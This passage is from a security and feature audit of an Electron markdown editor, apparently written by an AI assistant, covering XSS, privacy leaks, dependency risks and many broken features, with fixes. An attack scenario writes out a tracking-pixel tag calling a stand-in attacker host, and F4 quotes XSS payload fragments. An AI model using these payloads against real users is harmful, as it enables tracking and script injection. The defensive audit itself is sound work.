| `highlight.js` | `^11.12.0` (`package.json:43`) | `11.12.0` | LOW. Used at `markdown.ts:34,36` on document text; output is escaped by hljs (`hljs.highlight().value` HTML-escapes — I verified `<script>` inside a fence comes out as `&lt;script&gt;`). The `catch` fallback at `markdown.ts:39-42` escapes `&<>` manually — but **not quotes**, so it's a latent attribute-injection sink if the fallback output is ever placed in an attribute. Prefer DOMPurify over manual escaping. |
| `motion` | `^12.23.24` (`package.json:48`) | — | **LOW (dead weight).** Not imported anywhere in `src/`. Listed as a prod dep. Does **not** require `'unsafe-eval'` under any circumstance — so the prompt's concern that motion forces a permissive CSP is unfounded; nothing does. Remove. |
| `canvas-confetti` | `^1.9.4` (`package.json:40`) | — | LOW. Real dependency (`App.tsx:7,454,555`). No network, no eval. |
| `idb-keyval` | `^6.3.0` (`package.json:44`) | — | LOW, but privacy-relevant: persists full document bodies and `FileSystemFileHandle` objects unencrypted (`storage.ts:56,141`). See S12. |
| `@vitejs/plugin-react`, `lucide-react`, `autoprefixer`, `tsx`, `@types/*` | various | — | LOW. `@types/canvas-confetti` and `@types/jszip` are in **`dependencies`** not `devDependencies` (`package.json:37-38`) — type packages have zero runtime effect but inflate the prod tree. Cosmetic. |
| *Authenticode signing* | **absent** (`package.json:27-32`) | — | **MEDIUM.** `build.win` has no `certificateFile`/`signtoolOptions`. Unsigned Electron installers are indistinguishable from malware to SmartScreen and to endpoint AV. |
| *Lockfile discipline* | `bun.lock` present, `package.json` uses npm-style caret ranges | — | **MEDIUM.** CI uses `npm install --legacy-peer-deps --no-audit --no-fund` (workflow line 32) with **no committed `package-lock.json`** and no `--ignore-scripts`. Caret ranges + a fresh resolve per build = a compromised transitive dep lands in a release with no diff to review. Commit a lockfile, use `npm ci --ignore-scripts`, drop `--legacy-peer-deps`, drop `--no-audit`. |

---

## Additional findings

### [MEDIUM] S12. Privacy: full document corpus persisted unencrypted and duplicated into `localStorage`; remote images act as beacons

- **File:** `src/services/storage.ts:54-64`, `src/services/markdown.ts:18`, `src/data/samples.ts:31,34`
- **Code:**
```ts
export async function saveAllRecentFiles(files: MarkdownFileRecord[]): Promise<void> {
  try {
    await set(STORAGE_KEYS.RECENT_FILES, files);
  } catch (err) { ... }
  try {
    localStorage.setItem(STORAGE_KEYS.RECENT_FILES, JSON.stringify(files));
  } catch (err) { ... }
```
```ts
<img src="${href}" ... loading="lazy" />
```
- **Vulnerability:** Two distinct privacy problems.
  1. **Unencrypted, unbounded, duplicated persistence.** `saveAllRecentFiles` writes every document's *entire content* (`MarkdownFileRecord.content`) to IndexedDB **and then again** to `localStorage` (`storage.ts:61`). `localStorage` is plaintext, capped around 5-10 MB, never evicted by the OS, and readable by *any* script in the origin — which, per S1/S2, includes attacker payloads. There is no retention limit, no size cap, no opt-out, and no encryption. `syncFileHistory` (`storage.ts:93-109`) writes a second copy of the metadata. The app also persists raw `FileSystemFileHandle` objects (`storage.ts:139-145`) indefinitely, meaning a renderer compromise can silently re-open write access to every file the user has ever granted.
  2. **Remote image beacons / IP + UA disclosure.** The `image` renderer emits `<img src="${href}">` with **no scheme or host restriction**. Loading a document therefore performs GET requests to arbitrary third-party hosts, disclosing the user's IP address, User-Agent, `Accept-Language`, and the fact that a specific document was opened (via `Referer`/`Origin` and, in many deployments, a document-derived URL). The **default** `Welcome` document does this on first launch: `samples.ts:31,34` embed `images.unsplash.com/...`, and `CommandBar.tsx:292` inserts another Unsplash URL by default. A1×1 tracking pixel in a shared/hosted document is indistinguishable from a legitimate image to the user.
- **Attack scenario:** A user opens a "shared notes" `.md` from a colleague. Rendering triggers `<img src="https://attacker.tld/o.gif?u=hash">`. The attacker learns the user's IP, UA, locale, and open time — building a fingerprint and confirming the user received the file. Independently: the user's entire private document corpus sits in plaintext `localStorage`, recoverable by any later-origin script or by anyone with filesystem access to the Electron profile directory.
- **Severity justification:** Undisclosed third-party network egress from document viewing (CWE-359/CWE-200) plus unencrypted sensitive-data-at-rest (CWE-312) — CVSS ~5.3.
- **Fix:** Restrict `img-src` (see CSP), add an explicit opt-in for remote images with a host allowlist and a rendered warning, cap/expire the persisted corpus, and stop mirroring content into `localStorage`:
```ts
// storage.ts — IDB only, no localStorage mirror of document bodies
const MAX_RECORDS = 50;
export async function saveAllRecentFiles(files: MarkdownFileRecord[]): Promise<void> {
  const trimmed = files.slice(0, MAX_RECORDS);
  await set(STORAGE_KEYS.RECENT_FILES, trimmed);
  await set(STORAGE_KEYS.FILE_HISTORY,
    trimmed.map(({ id, name, path, size, lastOpened, wordCount, isPinned }) =>
      ({ id, name, path, size, lastOpened, wordCount, isPinned })));
  // settings stay in localStorage; document bodies do NOT
}
```
```ts
// markdown.ts — reject non-local schemes unless the user opted in
const isRemote = (u: string) => /^https?:\/\//i.test(u);
const isLocal = (u: string) => /^(data:|blob:|file:)/i.test(u);
const okImage = (u: string) => isLocal(u) || (allowRemoteImages && isRemote(u));
```

### [LOW] S13. Gemini capability is declared but not implemented; the documented key path would leak it into the client bundle

- **File:** `.env.example:1-4`, `metadata.json:5`, `package.json:35`
- **Code:**
```
# GEMINI_API_KEY: Required for Gemini AI API calls.
# AI Studio automatically injects this at runtime from user secrets.
GEMINI_API_KEY="MY_GEMINI_API_KEY"
```
```json
"majorCapabilities": ["MAJOR_CAPABILITY_SERVER_SIDE_GEMINI_API"]
```
- **Vulnerability:** `metadata.json:5` advertises `MAJOR_CAPABILITY_SERVER_SIDE_GEMINI_API` and `.env.example` documents `GEMINI_API_KEY`, but there is **no server-side Gemini proxy in this repository** — grep for `GEMINI`, `API_KEY`, `@google/genai`, `fetch(`, `XMLHttpRequest` across `src/` returns **zero** functional hits; the only matches are `.env.example`, `package.json:35`, `metadata.json:5`, and `bun.lock`. `@google/genai` is installed but never imported. So there is no key in the bundle **today**, and `.gitignore:7-8` (`.env*` with `!.env.example`) correctly prevents accidental commits. The finding is the trap: the natural next step for a developer reading `.env.example` is `new GoogleGenAI({ apiKey: import.meta.env.GEMINI_API_KEY })` in a component. Vite statically replaces `import.meta.env.VITE_*` (and any referenced env key) into the client bundle, and Electron ships that bundle to every user — the key becomes a plaintext string in `dist/assets/*.js`, extractable with `grep`. Note the naming trap too: `GEMINI_API_KEY` has no `VITE_` prefix, so it would silently be `undefined` and a developer would "fix" it by renaming to `VITE_GEMINI_API_KEY`, which is exactly the bundling case.
- **Attack scenario:** Not exploitable in the current code. Post-fix: the key ships in the renderer bundle; anyone who unpacks the installer (`asar` is trivially extractable without `OnlyLoadAppFromAsar`) recovers a Gemini key with quota/billing attached to the developer's project.
- **Severity justification:** No current exposure; metadata and docs misrepresent the architecture and invite a critical future mistake — CWE-522 adjacent, informational now.
- **Fix:** Make the metadata honest and keep the key out of the renderer permanently:
```json
{ "name": "Velox Markdown Studio", "description": "...", "requestFramePermissions": [], "majorCapabilities": [] }
```
Route any future Gemini call through the Electron **main** process over a narrow `contextBridge` IPC surface, read the key from the OS keychain (`safeStorage` + `app.getPath('userData')`), and never place it in `import.meta.env`. Alternatively keep `@google/genai` out of the client bundle entirely by moving it to a main-process-only path.

### [LOW] S14. Recursive `markedInstance.parse` inside the `blockquote` renderer — unbounded re-entrancy on nested input

- **File:** `src/services/markdown.ts:72-77`
- **Code:**
```ts
blockquote(token: any) {
  const rawText = token.text || '';
  // Parse inner content so bold (**text**), italics (*text**), and code render accurately
  const parsedContent = markedInstance.parse(rawText);
  return `<blockquote class="...">${parsedContent}</blockquote>`;
}
```
- **Vulnerability:** The renderer re-invokes the parser on its own output's inner text with no depth limit. I tested 400 levels of `>` and the parse completed, producing 400 nested `<blockquote>` elements — so it is not an immediate stack overflow, but it is unbounded work on attacker-controlled input, it re-parses content that `marked` has already tokenized, and it recursively re-enters the *same* renderer overrides. A document crafted with deeply nested blockquotes plus nested images (each of which builds the large `figure` template at `markdown.ts:15-27`) multiplies the cost. The renderer also discards `token.tokens`, so it throws away structure `marked` already computed.
- **Attack scenario:** A crafted `.md` with thousands of nested blockquotes is opened; rendering burns CPU on every keystroke in split view (`App.tsx:909-918` re-renders on each `onChange`), degrading the app.
- **Severity justification:** Unbounded re-entrant parsing on untrusted input — DoS only, no code execution — CWE-400, CVSS ~3.7.
- **Fix:** Use the already-tokenized children instead of re-parsing, and bound the work:
```ts
blockquote(token) {
  const inner = this.parser.parseInline(token.tokens ?? []);
  return `<blockquote class="border-l-4 border-sky-600 ...">${inner}</blockquote>`;
}
```
Plus a document-size guard at entry to `parseMarkdown`:
```ts
export function parseMarkdown(markdown: string): string {
  if (markdown.length > 2_000_000) return '<p class="text-amber-400">Document too large to preview.</p>';
  // ...
}
```

---

## 4. Unimplemented, Stubbed & Broken Features

> **Verification basis:** every file in `src/`, `electron/`, config and CI was read in full. `npm run lint` was executed and **passes (exit 0)**. Three claims in the task brief were checked and are **incorrect**, so they are corrected below rather than repeated: `metadata.json` is **valid JSON** (`node -e JSON.parse` → VALID); `canvas-confetti` **is** imported and used (`App.tsx:7,454,555`); the fresh-clone install failure is **real** but the cause is `esbuild`, not `@google/genai`.

### Master feature matrix

| # | Advertised feature | Advertised where | Status | Evidence (file:line) | Notes |
|---|---|---|---|---|---|
| 1 | **Gemini / "MAJOR_CAPABILITY_SERVER_SIDE_GEMINI_API"** | `metadata.json:5`, `.env.example:1-4` | **DEAD** | no `import` of `@google/genai` anywhere in `src/`; dep declared at `package.json:35` | No AI code, no UI, no key read, no graceful-failure path. Zero implementation. |
| 2 | **"Open .md file from Windows File Explorer"** | `HomePage.tsx:114`, `CommandBar.tsx:100`, `index.html:7` | **BROKEN** | `App.tsx:242-355` | `showOpenFilePicker` branch, then silent fallback to `<input type=file>` which yields **no** `FileSystemFileHandle` → file becomes read-only forever. |
| 3 | **"Save changes directly to Windows disk"** | `ShortcutsModal.tsx:20`, `samples.ts:22`, `StatusBar.tsx:42` | **PARTIAL** | `App.tsx:416-496` | Real `createWritable()` path exists, but only reachable if a handle was ever obtained. When not, it silently downgrades to IndexedDB and toasts a different message. |
| 4 | **"Save As" to a Windows folder** | `ShortcutsModal.tsx:25`, `App.tsx:499` | **PARTIAL** | `App.tsx:499-582` | `showSaveFilePicker` → else `downloadTextFile` (browser download), then claims "Downloaded". |
| 5 | **"Permanent Memory" (remembers every opened file, pinned favourites, disk handles across sessions)** | `samples.ts:17`, `HomePage.tsx:104`, `StatusBar.tsx:47` | **PARTIAL** | `storage.ts:23-191` | IDB persistence works, but stores **fabricated** paths, resurrects deleted samples, and is not session-restore. |
| 6 | **"…and search history"** | `samples.ts:17` | **DEAD** | `HomePage.tsx:47` (`useState('')`), `CommandPalette.tsx:50` | `searchQuery` is local component state; never written to IDB/localStorage. Nothing to restore. |
| 7 | **"disk handles across sessions"** | `samples.ts:17` | **BROKEN** | `storage.ts:139-145` | `FileSystemFileHandle` is written with `idb-keyval.set()` (structured clone). Chromium refuses to structured-clone handles outside the originating window's storage partition → the write throws, is swallowed by `console.warn`, and the handle is lost on restart. |
| 8 | **Windows File Path column / "Copy full Windows file path"** | `HomePage.tsx:424,474`, `TitleBar.tsx:67`, `StatusBar.tsx:57` | **BROKEN** | `App.tsx:266, 324, 527, 719` | Every path is the literal string `C:\Users\Windows\Documents\<name>`. "Copy path" copies a lie. |
| 9 | **Full-text content search + line-jump** | `HomePage.tsx:104,157`, `search.ts` | **WORKS** | `search.ts:7-91`, `HomePage.tsx:52-55` | Real snippet extraction, match counts, line-number jump to the raw editor. |
| 10 | **Quick search "Ctrl+K"** | `TitleBar.tsx:85,92`, `ShortcutsModal.tsx:42` | **WORKS** | `App.tsx:661-663`, `CommandPalette.tsx` | Toggles palette; arrow/Enter/Esc navigation real. |
| 11 | **Command palette commands (10)** | `CommandPalette.tsx:77-148` | **PARTIAL** | see Command matrix | 4 of 9 commands silently no-op on the Home view; "Print / Save as PDF" opens a modal instead of printing. |
| 12 | **Syntax highlighting** | `index.html:7`, `SampleFilesModal.tsx:35`, `samples.ts:41` | **WORKS** | `markdown.ts:29-71` | Real `hljs` integration with copy button + `highlightAuto` fallback. |
| 13 | **Responsive images + click-to-zoom lightbox** | `samples.ts:29`, `markdown.ts:16-27`, `CommandBar:292` | **PARTIAL** | `ImageLightboxModal.tsx` | Wired, but **zero keyboard support** (no Esc/arrows/wheel) and a dead `Download` import. |
| 14 | **"Interactive Task Checklist"** (click to toggle in preview) | `samples.ts:71,77-78`, `index.css:381-389` | **DEAD** | `MarkdownPreview.tsx:57-81` | `marked`'s `checkbox` renderer emits `disabled=""` by default, so `click` never fires. Entire handler + `onContentChange` prop are unreachable. |
| 15 | **Export: Markdown (.md)** | `ExportModal.tsx:116` | **WORKS** | `export.ts:6-44` | Blob download + data-URI fallback. |
| 16 | **Export: Web HTML (.html)** | `ExportModal.tsx:146` | **WORKS** | `export.ts:46-84` | Genuinely self-contained, inline CSS. |
| 17 | **Export: "Print to PDF"** | `ExportModal.tsx:176`, `CommandBar.tsx:365` | **BROKEN** | `ExportModal.tsx:180-188` (`window.print()`) | Fake PDF export, and there is **no `@media print` CSS at all** in `index.css` → prints the title bar, toolbar, status bar and the raw textarea. |
| 18 | **Export: PDF / EPUB / DOCX / ZIP** | `CommandBar.tsx:365` tooltip | **DEAD** | `jszip`/`@types/jszip` at `package.json:38,45` | Never offered, never imported. jszip + types are ~0 value dead weight. |
| 19 | **"Downloadable installer" / "Included (.bat / PWA)"** | `index.html:7`, `samples.ts:23,89` | **BROKEN** | CI emits `*.exe`; **no `.bat` exists**; `usePWAInstall` unused | Two false claims in the same sentence. |
| 20 | **"one-click PWA desktop installation"** | `samples.ts:23` | **DEAD** | `hooks/usePWAInstall.ts` | Hook is fully written and **imported by nothing**. No install button exists in any component. |
| 21 | **Service worker / offline** | `vite.config.ts:15-54` | **BROKEN** | `injectRegister` defaults to `'auto'` → `'script'` (no `virtual:pwa-register` import exists) | A `registerSW.js` + `<script>` **is** injected into `index.html`; over Electron's `file://` origin registration fails (Electron #2831/#9705) → console error every launch. |
| 22 | **PWA manifest** | `vite.config.ts:18-49` | **PARTIAL** | `theme_color: '#0f172a'` vs `index.html:12` `#0078d4`; `start_url`/`scope`/`icon.src` are absolute `/` while `base: './'` | Two different theme colours; absolute manifest URLs don't resolve under a sub-path deploy. |
| 23 | **Ctrl+F find / Ctrl+H replace** | `ShortcutsModal.tsx:47,52` | **PARTIAL** | `RawEditor.tsx:123-130` | Real implementation, but bound to the `<textarea>` `onKeyDown` only → dead in Preview mode. |
| 24 | **Ctrl+B / Ctrl+I formatting** | `ShortcutsModal.tsx:59,64`, `CommandBar:224,231` | **PARTIAL** | `RawEditor.tsx:131-137` | Works; but toolbar tooltips advertise it app-wide while it only exists in Raw/Split. |
| 25 | **Tab = 2-space indent** | `ShortcutsModal.tsx:69` | **PARTIAL** | `RawEditor.tsx:110-122` | Inserts 2 spaces. No dedent on Shift+Tab, no escape from the field, no block indent. |
| 26 | **Ctrl+P print/export** | `ShortcutsModal.tsx:76`, `CommandPalette.tsx:137` | **DEAD** | no handler in `App.tsx:643-667` | Documented in two places, implemented nowhere. Browser's own print is never intercepted. |
| 27 | **F11 fullscreen** | `ShortcutsModal.tsx:81` | **DEAD** | `TitleBar.tsx:24-34` (button only) | No keydown handler anywhere. |
| 28 | **Esc closes dialog / lightbox** | `ShortcutsModal.tsx:86`, `ShortcutsModal.tsx:245` | **PARTIAL** | only `CommandPalette.tsx:178` | Esc works in the palette only. Shortcuts, Export, Sample and Lightbox modals all ignore it. |
| 29 | **Minimize button** | `TitleBar.tsx:137` | **DEAD** | `TitleBar.tsx:131-133` `window.blur()` | Blurs the window; does not minimize. No preload ⇒ no `ipcRenderer` ⇒ cannot. |
| 30 | **Window Close button** | `TitleBar.tsx:157` | **PARTIAL** | `TitleBar.tsx:150-155` | Guarded by `if (activeTab)` → **does nothing on the Home tab**. No unsaved-changes check. |
| 31 | **"Windows 11 Fluent" window** | `HomePage.tsx:100`, `samples.ts:73` | **BROKEN** | `electron/main.cjs:14` `frame: true` | The app draws fake caption buttons **and** Electron draws a real native title bar → two title bars stacked. |
| 32 | **App icon in the packaged build** | `electron/main.cjs:17` | **BROKEN** | `package.json:23-26` `files: ["dist/**/*","electron/**/*"]` | `public/` is **not packaged**, so `../public/favicon.ico` doesn't exist in the asar; `build.win.icon` is also unset → installer/exe get the default Electron icon. |
| 33 | **Theme toggle + persistence** | `TitleBar.tsx:118`, `App.tsx:124-140` | **WORKS** | `App.tsx:135-136` → `storage.ts:205` | The only setting actually persisted. |
| 34 | **Font zoom / word wrap / sync-scroll settings** | `CommandBar.tsx:328,338,207` | **PARTIAL** | read at `App.tsx:110-112`, **never written back** | `saveAppSettings` is called from exactly one place (theme). Zoom, wrap and sync-scroll reset on every restart. |
| 35 | **`accentColor`, `lineNumbers`, `defaultViewMode`, `autoSave` settings** | `types/index.ts:59,62,64,65`, `storage.ts:14-20` | **DEAD** | no readers/writers outside the defaults object | Four declared settings with no UI and no effect. |
| 36 | **`getFileHistory()`** | `storage.ts:70` | **DEAD** | no callers | Exported API never used. |
| 37 | **`exportDocumentAsHtml()`** | `export.ts:86` | **DEAD** | no callers | `ExportModal` re-implements it inline instead. |
| 38 | **Sample library** | `HomePage.tsx:143`, `CommandPalette.tsx:143` | **PARTIAL** | `App.tsx:982-987` → `App.tsx:189` `if (!record) return;` | Samples load only while they exist in IndexedDB. After **Clear History** or deleting a sample, clicking one does nothing and the modal closes. |
| 39 | **Drag & drop .md onto window** | `App.tsx:674-764` | **PARTIAL** | `App.tsx:711` | Real, but uses `item.getAsFile()` instead of `getAsFileSystemHandle()` → dropped files are read-only, same trap as #2. Images are ignored. |
| 40 | **Status bar metrics** | `StatusBar.tsx:74-88` | **PARTIAL** | see Detailed findings F13 | Words/chars/read-time are real. `Ln/Col` frozen at 1,1 in Preview. **`CRLF` is hardcoded and factually wrong.** |
| 41 | **Sync scroll** | `CommandBar.tsx:207` | **WORKS** | `App.tsx:81-103`, `RawEditor.tsx:169-178` | Percentage-based with a 45 ms re-entrancy lock. Functional. |
| 42 | **Tabs** | `TabBar.tsx` | **PARTIAL** | `App.tsx:592-608` | Closing a dirty tab is explicitly unguarded ("without blocking dialogs"); no dirty-close prompt; no reorder. |
| 43 | **Undo / redo across tabs** | (not advertised) | **PARTIAL** | `RawEditor.tsx` | Native textarea undo only; broken by the controlled-component `onChange` + `setTimeout(setSelectionRange)` pattern; no app-level history; none in Preview. |
| 44 | **Spellcheck** | (not advertised) | **DEAD by choice** | `RawEditor.tsx:348` `spellCheck={false}` | Undocumented hard-disable in a *Windows-native* editor. |
| 45 | **"HMR disabled in AI Studio via DISABLE_HMR"** | `vite.config.ts:62-64` | **DEAD** | no `.env`, no AI Studio host | Vestigial AI-Studio scaffolding; `DISABLE_HMR` is never set anywhere. |
| 46 | **`APP_URL` env var** | `.env.example:6-9` | **DEAD** | no reader | Nothing consumes it. |
| 47 | **AI Studio "applet"** | `.env.example:2,7`; `vite.config.ts:62` | **DEAD** | — | This is an Electron Windows desktop app; the AI Studio/Cloud Run scaffolding is copy-paste residue. |

---

### Detailed findings

#### [HIGH] F1. `npm install` fails on a fresh clone — the project does not install
- **Type:** BROKEN
- **File:** `package.json:63` (`"esbuild": "^0.25.0"`), `package.json:51` (`"vite": "^8.3.0"`)
- **Code:** `"vite": "^8.3.0"`, `"esbuild": "^0.25.0"` (devDependency)
- **Why it fails / what's missing:** `npm install --dry-run` → `ERESOLVE could not resolve … While resolving: vite@8.3.2 / Found: esbuild@0.25.12 / Could not resolve dependency: peerOptional esbuild@"^0.27.0 || ^0.28.0" from vite@8.3.2`. Anyone cloning the repo must know to pass `--legacy-peer-deps`. The flag is present in CI (`.github/workflows/build-windows-exe.yml:32`) but nowhere in `README`/`package.json`, and there is no README to put it in. `esbuild` is also entirely unused by this project (Vite 8 bundles Rolldown), so the pinned range exists for no reason.
- **Fix:** Delete the `esbuild` devDependency (and `tsx`, both unused), or bump to `^0.28.0`. Add an `engines` block and commit a `package-lock.json`; document the bootstrap command.

#### [HIGH] F2. The headline feature — "Direct Windows Disk Sync" — is structurally unreachable in the packaged app
- **Type:** BROKEN
- **File:** `App.tsx:242-356` (Open), `App.tsx:503-575` (Save As), `App.tsx:419-466` (Save)
- **Code:**
```tsx
if ('showOpenFilePicker' in window) { /* … */ }
…
// Fallback: file input element
const input = document.createElement('input');
input.type = 'file';
input.onchange = async (e) => { /* … FileReader … */ };
input.click();
```
- **Why it fails / what's missing:** `electron/main.cjs:37` loads the app with `win.loadFile()` → a `file://` origin. The File System Access API is gated on an eligible origin; on `file://` it is unavailable, so `'showOpenFilePicker' in window` is false and the app *silently* falls through to the `<input type=file>` branch. That branch produces **no** `FileSystemFileHandle`, so `FileTab.fileHandle` is never set, and `handleSave` can only ever reach the IndexedDB branch at `App.tsx:468`. `showSaveFilePicker` has the same problem and falls back to `downloadTextFile`. Net effect in the shipped `.exe`: **the editor can never write back to the file you opened.** The user is only told via a toast at `App.tsx:495`, after they've already lost the notion that a real file is open. There is also no Electron-native fallback because `nodeIntegration:false` + `contextIsolation:true` (`main.cjs:19-20`) and **no preload script** mean the renderer cannot call `dialog.showOpenDialog`/`showSaveDialog`/`fs`.
- **Fix:** Ship a preload + contextBridge API and do real file I/O in main:
```js
// electron/preload.cjs
const { contextBridge, ipcRenderer } = require('electron');
contextBridge.exposeInMainWorld('velox', {
  open:   () => ipcRenderer.invoke('md:open'),
  save:   (_id, text) => ipcRenderer.invoke('md:save', _id, text),
  // …
});
```
```js
// electron/main.cjs
ipcMain.handle('md:open', async () => {
  const { canceled, filePaths } = await dialog.showOpenDialog({ /* … */ });
  if (canceled) return null;
  return { path: filePaths[0], text: await fs.promises.readFile(filePaths[0], 'utf8') };
});
```
Keep the `showOpenFilePicker` path for the browser build. Track the real path per tab so #3 below is fixed too.

#### [HIGH] F3. Every file path in the app is fabricated — and causes record collisions
- **Type:** BROKEN
- **File:** `App.tsx:266`, `App.tsx:324`, `App.tsx:527`, `App.tsx:719`
- **Code:**
```tsx
path: `C:\\Users\\Windows\\Documents\\${file.name}`,
```
- **Why it fails / what's missing:** This literal is written for files opened via the picker, the `<input>` fallback, **Save As**, and drag-drop. Consequences: (a) `HomePage.tsx:424` renders a "Windows File Path" column full of fiction; (b) `HomePage.tsx:474` "Copy full Windows file path" copies fiction; (c) `TitleBar.tsx:67` and `StatusBar.tsx:57` show fiction; (d) **`storage.ts:116-118` merges records by `f.path === file.path`**, so opening `C:\a\notes.md` and later `C:\b\notes.md` maps both to `C:\Users\Windows\Documents\notes.md` and the second save **silently overwrites the first file's content and metadata**. That's real data loss caused by the placeholder.
- **Fix:** With F2's main-process dialogs you get a genuine path — store it. Interim fix: make the placeholder honest (`''` / `'Opened via file picker'`), and drop the `|| f.path === file.path` clause at `storage.ts:117`, matching on `id` only.

#### [HIGH] F4. `dangerouslySetInnerHTML` with unsanitised `marked` output — stored XSS from any opened `.md`
- **Type:** BROKEN
- **File:** `MarkdownPreview.tsx:147`, `markdown.ts:10-79`
- **Code:**
```tsx
dangerouslySetInnerHTML={{ __html: htmlContent }}
```
- **Why it fails / what's missing:** `marked` has not had a `sanitize` option since v13 (this project pins v18); raw HTML in Markdown passes straight through. Any `.md` file — including one dragged in from an untrusted source — can contain `<img src=x onerror="…">` or `<script>`, which execute inside the app window. There is **no CSP** anywhere (`index.html` has no `meta http-equiv="Content-Security-Policy"`, `main.cjs` sets none), so nothing constrains it. The custom `image()` renderer makes it worse: it interpolates `href`, `title` and `text` straight into attribute positions with no escaping (`markdown.ts:13-18`), so `![x](javascript:alert(1))` executes on click (marked's default renderer ran `cleanUrl`, which this override bypasses) and `![a"onerror="…](x)` breaks out of the attribute.
- **Fix:** Sanitise before injecting — `dompurify` after `marked`, or a renderer that escapes `href`/`title`/`text` and drops `javascript:` URLs. Add a CSP to `index.html` (`default-src 'self'; img-src 'self' https: data:; style-src 'self' 'unsafe-inline'`) and set one in `main.cjs` via `session.defaultSession.webRequest.onHeadersReceived`.

#### [HIGH] F5. In-app navigation is unguarded — a Markdown link can replace the whole editor
- **Type:** BROKEN
- **File:** `electron/main.cjs:8-42`
- **Code:**
```js
const win = new BrowserWindow({ … webPreferences: { nodeIntegration: false, contextIsolation: true, webSecurity: true } });
…
win.loadFile(resolvedPath);
```
- **Why it fails / what's missing:** There is **no `preload`**, **no `will-navigate`**, **no `setWindowOpenHandler`** and **no `shell.openExternal`**. Rendered Markdown contains `<a href="https://…">` (the app's own toolbar inserts one at `CommandBar.tsx:299`). Clicking it inside the preview navigates the `BrowserWindow` away from `dist/index.html` to the remote site — the editor is gone, `beforeunload` doesn't exist, and unsaved tabs are lost. `target="_blank"` links spawn a second `BrowserWindow` with no chrome, no menu and no error handling.
- **Fix:**
```js
win.webContents.setWindowOpenHandler(({ url }) => {
  if (/^https?:/.test(url)) require('electron').shell.openExternal(url);
  return { action: 'deny' };
});
win.webContents.on('will-navigate', (e, url) => {
  if (url !== win.webContents.getURL()) e.preventDefault();
});
```

#### [HIGH] F6. Fake Windows caption buttons that cannot do their job
- **Type:** BROKEN
- **File:** `TitleBar.tsx:130-161`, `electron/main.cjs:14`
- **Code:**
```tsx
<button onClick={() => { window.blur(); }} title="Minimize"> <Minus/> </button>
…
<button onClick={() => { if (activeTab) { window.close(); } }} title="Close"> <X/> </button>
```
- **Why it fails / what's missing:** Three independent defects. (1) **Minimize does nothing** — `window.blur()` just unfocuses; with no preload there is no `ipcRenderer` route to `win.minimize()`. (2) **Close is conditional on `activeTab`** — sitting on the Home tab the red X is completely inert, so the app appears unable to close. (3) `main.cjs:14` sets `frame: true`, so the real native title bar is *also* rendered above these fakes — two title bars, and the native one can't be Fluent-themed. The Maximize button uses the Fullscreen API, not `win.maximize()`, and never listens for `fullscreenchange`, so its label desyncs (`TitleBar.tsx:21-33`).
- **Fix:** Either go frameless (`titleBarStyle: 'hidden'`, `titleBarOverlay`) **and** expose `{minimize,maximize,unmaximize,close,isMaximized}` over IPC, or delete the three fake buttons and keep the native frame. Do not ship both. Add `useEffect(() => { const f = () => setIsFullscreen(!!document.fullscreenElement); document.addEventListener('fullscreenchange', f); return () => document.removeEventListener('fullscreenchange', f); }, [])`.

#### [HIGH] F7. Interactive task-list checkboxes are dead code
- **Type:** DEAD
- **File:** `MarkdownPreview.tsx:57-81`
- **Code:**
```tsx
if (target.tagName === 'INPUT' && (target as HTMLInputElement).type === 'checkbox') {
  const checkbox = target as HTMLInputElement;
  if (onContentChange) {
    const allCheckboxes = Array.from(container.querySelectorAll('input[type="checkbox"]'));
    const checkboxIndex = allCheckboxes.indexOf(checkbox);
    …
 onContentChange(updated);
  }
  return;
}
```
- **Why it fails / what's missing:** `marked`'s `checkbox` renderer emits `<input … disabled="" type="checkbox">` by default (maintainers confirm: "You can override the `checkbox` renderer and remove the `disabled` attribute" — marked discussion #3494). A `disabled` input does not dispatch `click`, so this handler can never run, `checkboxIndex` is always `-1`, and `onContentChange` is never invoked. `index.css:381-389` styles these inputs with `cursor: pointer`, and `samples.ts:71-78` ships a checklist to demonstrate the feature — a feature that cannot fire. This also makes the entire `onContentChange` prop chain (`App.tsx:886,914` → `MarkdownPreview.tsx:60,77`) unreachable: the preview can no longer write to the document.
- **Fix:** Override the renderer once in `markdown.ts`:
```ts
markedInstance.use({ renderer: { checkbox: ({ checked }) =>
  `<input ${checked ? 'checked="" ' : ''}type="checkbox" data-task>` } });
```
Keep the index-based rewrite (it is correct), but key the replacement off `data-task` ordinals captured at render time rather than a global checkbox index.

#### [HIGH] F8. `targetLine` is never cleared → the line-jump hijacks the cursor forever
- **Type:** BROKEN
- **File:** `App.tsx:187-188, 224` (set, never cleared) → `RawEditor.tsx:73-103`
- **Code:**
```tsx
// RawEditor.tsx
const scrollToLine = useCallback((lineNumber: number) => { … }, [content]);   // depends on content
useEffect(() => {
  if (targetLine && targetLine > 0) { setTimeout(() => { scrollToLine(targetLine); }, 100); }
}, [targetLine, scrollToLine]);
```
- **Why it fails / what's missing:** `App.tsx` sets `targetLine` on every search-snippet jump and **never resets it to `null`**. Because `scrollToLine` is memoised on `content`, its identity changes on *every keystroke*, which re-fires the effect, which re-selects the target line (`setSelectionRange(charIndex, charIndex + lineLength)`) and re-scrolls. After one search-result click, typing in the document is effectively impossible: the caret snaps back to the found line on each character. This is the single most user-hostile bug in the app.
- **Fix:** Consume the value.
```tsx
// App.tsx, in handleOpenFileById
setTargetLine(lineToJump);
setTimeout(() => { editorRef.current?.scrollToLine(lineToJump); setTargetLine(null); }, 200);
```
and drop the `content` dependency from the `scrollToLine` callback (use a ref for the latest content), so the effect fires exactly once per jump request.

#### [HIGH] F9. Print / "Save as PDF" prints the application chrome
- **Type:** BROKEN
- **File:** `ExportModal.tsx:180-188`, `index.css` (no `@media print` anywhere)
- **Code:**
```tsx
onClick={() => { onClose(); setTimeout(() => window.print(), 100); }}
```
- **Why it fails / what's missing:** `window.print()` on the live DOM. There is **not a single `@media print` rule** in `index.css` (394 lines, all screen styles), so Chromium prints the custom title bar, tab bar, command bar, status bar and the `Ctrl+K` search field. In Raw/Split mode it prints the `<textarea>` — i.e. only the visible scroll window of a long document, plus the line-number gutter. `CommandBar.tsx:365` nonetheless advertises "Export Document (Download Markdown, HTML, **PDF**, or copy to clipboard)". There is no real PDF generator in the dependency tree.
- **Fix:** Add a print stylesheet that hides chrome and unpagines the preview:
```css
@media print {
  header, [role="toolbar"], footer, .no-print { display: none !important; }
  .markdown-body { max-width: none; padding: 0; overflow: visible; font-size: 11pt; color: #000; background: #fff; }
  .markdown-body pre { white-space: pre-wrap; word-break: break-word; border: 1px solid #ccc; }
  .markdown-body a::after { content: " (" attr(href) ")"; font-size: 9pt; }
  @page { margin: 18mm; }
}
```
